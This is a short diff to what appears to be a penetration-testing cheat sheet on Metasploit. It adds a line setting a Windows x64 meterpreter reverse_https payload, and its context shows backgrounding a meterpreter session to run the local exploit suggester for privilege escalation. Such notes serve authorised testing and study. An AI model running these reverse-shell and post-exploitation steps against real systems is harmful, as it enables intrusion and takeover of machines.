@@ -2,7 +2,7 @@
 ---
 
 ### Use Scanners/Exploit in meterpreter session
-
+set payload windows/x64/meterpreter/reverse_https
 ```sh
 meterpreter > background
 use post/multi/recon/local_exploit_suggester
